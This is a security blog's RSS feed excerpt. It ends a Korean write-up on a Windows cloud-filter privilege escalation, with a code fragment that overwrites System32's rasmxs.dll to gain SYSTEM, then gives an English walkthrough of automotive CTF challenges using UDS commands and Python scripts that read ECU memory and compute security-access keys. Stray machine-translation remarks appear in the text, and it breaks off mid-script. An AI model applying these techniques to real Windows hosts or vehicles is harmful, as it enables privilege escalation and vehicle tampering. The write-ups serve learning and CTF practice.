class="hljs-string">L&quot;C:\\Windows\\System32\\rasmxs.dll&quot;</span>, GENERIC_WRITE,...);WriteFile(handle, buffer, bytesRead, ...);trigger_loadlibrary(<span class="hljs-number">1</span>);</code></pre><p>&#xC774; &#xD578;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC900;&#xBE44;&#xD55C; &#xC545;&#xC131; DLL &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; <code>WriteFile()</code>&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xACBD;&#xB85C;&#xC758; <code>rasmxs.dll</code>&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>trigger_loadlibrary(1)</code>&#xC774; <code>rasman.dll</code> &#xB0B4;&#xBD80; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; rasman &#xC11C;&#xBE44;&#xC2A4;&#xC640;&#xC758; RPC &#xD638;&#xCD9C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC11C;&#xBE44;&#xC2A4; &#xCABD;&#xC5D0;&#xC11C; &#xD3C9;&#xC18C; &#xB3D9;&#xC791;&#xB300;&#xB85C; <code>C:\Windows\System32\rasmxs.dll</code>&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB3C4;&#xB85D; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; DLL &#xB0B4;&#xC6A9;&#xC740; &#xACF5;&#xACA9;&#xC790; &#xCF54;&#xB4DC;&#xB85C; &#xAD50;&#xCCB4;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC218;&#xC815;&#xB41C; <code>rasmxs.dll</code>&#xC774; rasmans &#xC11C;&#xBE44;&#xC2A4; SYSTEM &#xAD8C;&#xD55C; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55680">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55680</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLDFLT/">CLDFLT</category>
      
      <category domain="https://hackyboiz.github.io/tags/TOCTOU/">TOCTOU</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN)</title>
      <link>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/</link>
      <guid>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/</guid>
      <pubDate>Thu, 20 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;i</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>In the automotive field, a communication protocol that is frequently used and applied is CAN communication. Security vulnerabilities can also occur in this CAN communication! Many CTFs and competitions are also being held targeting the automotive sector (Defcon also has a Car Hacking Village).</p><p>In this article, we&#x2019;ll solve a problem from the BlockHarbor CTF, one of the most famous CTFs for vehicle hacking, to learn about vehicle communication and the resulting security vulnerabilities!</p><h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p><p>CAN (Controller Area Network) communication is a protocol developed for communication between devices within a vehicle, such as ECUs (Electronic Control Units). It uses a message-based, low-level network communication system in a non-host bus manner. Since it was developed in 1983, it predates the HTTP protocol! A basic CAN message consists of 8 Bytes, and the extended version, CAN-FD (Flexible Data-rate), can represent data up to 64 Bytes.</p><p>Furthermore, the international standard for CAN communication is specified by ISO 15765.</p><p><img src="image03.png" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p><p>UDS stands for Unified Diagnostic Services, and you&#x2019;ll frequently encounter this term when dealing with vehicle CTFs and CAN communication. It is a protocol used for diagnostic communication, primarily employed with ECUs. Since it is a higher-level protocol than the low-level CAN protocol, it allows for various functions such as data Read/Write (R/W).</p><p>The international standard for the UDS message structure operating over CAN communication was designated by ISO 15765.</p><p>Since knowing the UDS message structure is crucial for the BlockHarbor CTF challenge we are about to solve, let&#x2019;s briefly look at it. The UDS message is structured as shown in the picture above. A simple explanation of each part is as follows:</p><ul><li>CAN ID: The ECU that will transmit or receive the message.</li><li>PCI (Protocol Control Information): Primarily used for the length of the UDS message(DLC), Flow Control, etc.</li><li>SID (Service Identifier): Identifies the requested service.<ul><li>Sub Function Byte: Detailed options for the SID.</li></ul></li><li>DID (Data Identifier): Identifies the data being accessed.</li></ul><p>Now, I will explain some of the more important items among these.</p><p><img src="image04.png" alt="image04.png"></p><p>The CAN ID values for each ECU are set as hexadecimal values according to ISO 15765-4.</p><ul><li><code>7DF</code> is primarily the identifier used for broadcasting to all ECUs or for internal functions/settings to be delivered to an ECU.</li><li>For transmission, the CAN IDs are designated as <code>7E0</code> for ECU 1, <code>7E1</code> for ECU 2, and so on.</li><li>For reception, the ID is designated as the transmission value <code>+ 0x8</code>.</li></ul><p>The SID (Service Identifier) can simply be described as the identifier that signals what action (service) will be performed. Since the SID values are also standardized, you can directly check the SID value corresponding to a service through the <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">document</a>. The corresponding Response SID (RSID) value is the request SID value <code>+ 0x40</code>. If the RSID, which is the response to the requested SID, is successfully received, it indicates that the communication was successful.</p><p>Additionally, there are commands among the SIDs that include a Sub Function Byte. This is used to designate a more detailed service request when an SID is requested. It is optional and may or may not be used, which can be confirmed by checking the documentation.</p><p>The DID (Data Identifier) is the identifier that refers to the data. Many DID values are also reserved according to the ISO-14229 standard, so you can check the <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">document</a> to find the appropriate DID value. The most representative example of a DID is the VIN (Vehicle Identification Number) value, which is <code>F190</code>. If you request this DID value along with an SID, the service corresponding to the SID will be executed targeting the VIN.</p><p>In the case of SIDs that use the Sub Function Byte, which we just explained, there are instances where a DID may not be necessary.</p><p>When solving the upcoming BlockHarbor CTF problems, it is absolutely essential to keep the <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> documentation pages open and look up the commands as you go!</p><h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" alt="image05.jpg"></p><p>To transmit and receive CAN/UDS messages, you can use the can-utils tool. This tool is based on SocketCAN, which implements the CAN protocol on Linux. I&#x2019;ll explain this using the example shown below.</p><pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre><p><code>candump</code> is a tool that allows you to receive CAN/UDS messages. By specifying the desired CAN network interface, you can receive CAN messages from that interface. In the example above , the <code>-a</code> option was added to show the ASCII results along with the CAN message, and masking arguments <code>7E0</code> and <code>7FF</code> were added to receive data only from ECU 1.</p><p>When solving the CTF problems later, this command will be frequently used on one terminal to run and check the responses.</p><pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p><code>cansend</code> is a tool that allows you to transmit CAN/UDS messages. Similarly, it can send a CAN message to the desired CAN network interface. For the upcoming problems, you will need to construct the message by properly configuring the SID and DID according to the UDS format explained earlier and then transmit it.</p><p>Additionally, for cases where the response data is larger than the basic CAN message length of 8 Bytes, a commonly used technique is to send a Flow Control request, such as <code>30000000</code>, along with the message to ensure all data is received.</p><p>By using <code>cansend</code> to transmit a message and then confirming the response data with <code>candump</code>, you can verify the entire CAN/UDS communication process.</p><h2 id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" alt="image06.jpg"></p><p>BlockHarbor CTF is an Automotive Capture the Flag (CTF) competition created by the automotive cybersecurity company, Block Harbor. It is highly recommended for solving vehicle hacking problems because it provides a virtual CAN interface environment and a simulation environment for communication between ECUs, making it convenient for hands-on practice with CAN/UDS commands.</p><p>The site is broadly composed of two parts: the <a href="https://proving-grounds.blockharbor.io/">CTF Problem Site</a>, which is built on the CTFd platform, and the <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> site, which establishes the vehicle simulation environment. If you are new to CAN/UDS and vehicle systems, it is recommended that you start with the &#x201C;Getting Started&#x201D; problems on the CTF problem site.</p><p><img src="image07.png" alt="image07.png"></p><p>When you connect to <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>, navigate to Other - Learn - SIMULATIONS. By clicking the terminal icon on the right side of Proving Grounds, you can access the vehicle simulation environment&#x2019;s terminal via the web in various environments. Since we will be solving the UDS Challenge problems, we will connect to the UDS Challenge terminal. If you are solving different problems, you can connect to another simulation terminal and use the environment appropriate for that problem.</p><p><img src="image08.png" alt="image08.png"></p><p>When you connect via the terminal icon, you will access a tmux shell like the one shown above. You can solve the CTF problems you&#x2019;ve identified within this environment.</p><h3 id="2-1-tmux-setting"><a href="#2-1-tmux-setting" class="headerlink" title="2.1 tmux setting"></a>2.1 tmux setting</h3><p>To use the tmux terminal environment, you can configure a better problem-solving setup with a few tmux commands and settings. BlockHarbor itself has created a basic <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux introduction</a> via their landing page. I will explain a few of the frequently used commands from that guide.</p><p><img src="image09.png" alt="image09.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>Ctrl + b%<span class="hljs-comment"># Terminal moving</span>Ctrl + b&#x2190; &#x2192;<span class="hljs-comment"># Terminal scroll</span>Ctrl + b[<span class="hljs-comment"># End scroll</span>Ctrl + c</code></pre><p>You didn&#x2019;t provide the list of tmux commands, but based on your comment, here is the translation emphasizing the general idea:</p><p>The commands and settings listed above are those that are frequently used in practice. Terminal splitting and navigation are used especially often. For additional settings or commands you may want, you can check the <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux intro</a> or search online.</p><h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" alt="image10.png"></p><p>The UDS Challenge problems we will solve are tackled by performing the actions required by the problem using UDS commands and controlling the vehicle environment. The <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> used to solve the problems can be found in the documentation introduced earlier.</p><p>Let&#x2019;s start solving the problems right away!</p><h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" alt="image11.png"></p><p>This problem requires you to retrieve the VIN (Vehicle Identification Number) using UDS.</p><p>The VIN is the Vehicle Identification Number, which was briefly discussed when explaining the commands earlier! The task is to query this value in the simulation environment.</p><p><img src="image12.png" alt="image12.png"></p><p>The translation is:</p><p>First, by checking the network interfaces in the simulation environment, you can confirm the virtual CAN interface, vcan0. You should target this interface when transmitting and receiving CAN/UDS messages.</p><p><img src="image13.png" alt="image13.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(DLC:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>To monitor the transmission and reception messages for the broadcast and ECU 1, I added masking for three CAN IDs in candump. Afterward, I combined the VIN DID and the Read Data By Identifier (SID) and transmitted the message. Since the response comes from ECU 1, by sending a Flow Control request to that ECU, the full VIN can be confirmed, and the flag can be identified!</p><pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre><p>Let&#x2019;s examine the received message in detail.</p><p>Upon making the Read Data By Identifier request (<code>22</code>), we can confirm the correct RSID (<code>62</code>) response. Following this, a large amount of data is returned, and continuous values like <code>21</code> and <code>22</code> are indicated before these data packets. This confirms that the data is continuous (a multi-frame transfer). </p><h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" alt="image14.png"></p><p>This problem asks about how to restart an ECU. It also states that the diagnostic information is broadcast using <code>7DF</code>.</p><p><img src="image15.png" alt="image15.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(DLC:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre><p>The simple way to Restart the ECU is to send a Reset request (<code>11</code>). For the Reset request used in this problem, we use the Default Session (<code>01</code>) Sub Function Byte. Because of this, no separate DID is used. </p><p>When the ECU Reset request with the Default Session is transmitted, you can confirm the corresponding RSID response (<code>51</code>). Subsequently, you can also obtain the flag information!</p><h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" alt="image16.png"></p><p>This problem requires reading the Diagnostic Trouble Codes (DTCs). You must authenticate the flag by matching the DTC format, which is typically <code>Pxxxx-xx</code>.</p><p><img src="image17.png" alt="image17.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(DLC:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre><p>The problem can be solved by sending a Read DTC Information request (<code>19</code>). The DTC (Diagnostic Trouble Codes) can be viewed using a Status Mask. The detailed DTC Status Byte can be found in the <a href="https://buly.kr/2UjxlRq">AUTOSAR documentation</a>.</p><p>The confirmed DTC is <code>P3E9F-01</code>. Since DTCs are used in OBD2 for vehicle diagnostics, you can refer to the corresponding standard, the <a href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> document, to understand how to interpret the DTC code.</p><h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" alt="image18.png"></p><p>This problem requires a Read Memory By Address request. The accessible memory area is stated to start from <code>0xC3F80000</code>.</p><p><img src="image19.png" alt="image19.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 07(DLC:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>Data in memory can be read using a memory read request (<code>23</code>).</p><p>A point to note here is that you must calculate and use the value (<code>14</code>) corresponding to the AddressAndLengthFormatIdentifier (AALFId) before specifying the address. You can understand the explanation of AALFId by referring to <a href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">this video</a>. Consequently, reading is possible by sending a read request for 255 (<code>FF</code>) bytes using the value <code>14</code>, which requests the use of a 4-byte address and 1-byte length format.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data[:dlc]recvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    p.settimeout(<span class="hljs-number">0.5</span>)    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))        <span class="hljs-keyword">try</span>:            resp_frame = p.recv(<span class="hljs-number">16</span>)            resp_id, resp_data = dissect_can_frame(resp_frame)            <span class="hljs-keyword">if</span> resp_data:                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]        <span class="hljs-keyword">except</span> socket.timeout:            <span class="hljs-keyword">continue</span>        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):            <span class="hljs-keyword">try</span>:                resp_frame = p.recv(<span class="hljs-number">16</span>)                _, resp_data = dissect_can_frame(resp_frame)                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                    recvdata += tempdata            <span class="hljs-keyword">except</span> socket.timeout:                <span class="hljs-keyword">break</span>    hex_data_string = recvdata    <span class="hljs-keyword">try</span>:        byte_data = bytes.fromhex(hex_data_string)        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)        print(ascii_string)            <span class="hljs-keyword">except</span> ValueError:        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre><p>Through the code above, data in the <code>0xC3F83000</code> range can be parsed.</p><p>Although the Python <code>can</code> module is typically used for CAN communication, it is unavailable in a simulation environment&#x2026; Therefore, it was written using the <code>socket</code> module as a replacement.</p><p>When representing the CAN format with the Python <code>socket</code> module, the argument <code>=IB3x8s</code> must be provided.</p><p><img src="image20.png" alt="image20.png"></p><p>The flag present in memory can be confirmed by executing the code.</p><h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" alt="image21.png"></p><p>This challenge requires identifying the cryptographic algorithm for Security Access Level 3 and finding the corresponding key for the seed value 0x1337. As described in the problem, the length of both the seed and the key for Level 3 is 2 bytes.</p><p><img src="image22.png" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p><p>First, let&#x2019;s look at the Security Access function provided by UDS.</p><p>Security Access is a service that controls access rights to the ECU. It&#x2019;s helpful to think of higher numbers representing higher levels of authority. It is used with SID <code>27</code> after first changing to the Extended Diagnostic Session (<code>10</code> - <code>03</code>).</p><p>A seed value is generated, and a key is created through an internal cryptographic algorithm. Communication is performed in a way that grants access if authentication with the corresponding key value is successful. A key point here is that only when sending the key value, the request must be made using the access level value being accessed plus 1.</p><p><img src="image23.png" alt="image23.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(DLC:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(DLC:len) 27(SID:SecurityAccess) 03(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022703</span><span class="hljs-comment"># 04(DLC:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre><p>Authentication for Level 3 can be performed according to the Security Access authentication sequence.</p><p>First, after changing to the Extended Diagnostic Session (<code>1030</code>), the seed value <code>7E53</code> generated by the Security Access Level 3 request (<code>2703</code>) can be confirmed. Upon transmitting the corresponding key value, Security Access was successful, as confirmed by the Security Access RSID (<code>67</code>).</p><p>The cryptographic algorithm used was a simple one that performs a bitwise inversion of the seed value. Therefore, the flag can be obtained as the result of <code>0x1337 ^ 0xFFFF</code>.</p><pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)        key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)        key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre><p><img src="image24.png" alt="image24.png"></p><p>Additionally, the calculated key value must be transmitted within a very short time after confirming the seed value. Therefore, it is recommended to write code like the one above (though you can do it manually if you are fast enough).</p><h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" alt="image25.png"></p><p>This challenge requires identifying the Security Access Level 1 cryptographic algorithm by reading the memory in the <code>0x1A000</code> range. The flag is the key value for the seed <code>0x7D0E1A5C</code>. It is known that the seed and key lengths for Level 1 are 4 bytes.</p><p>Oddly, in this UDS Challenge, Level 1 is placed after Level 3.</p><pre><code class="hljs python"><span class="hljs-comment"># read memory</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, dlc, datarecvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    can_id_filter = <span class="hljs-number">0x7E8</span>    can_mask_filter = <span class="hljs-number">0xFFF</span>    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span 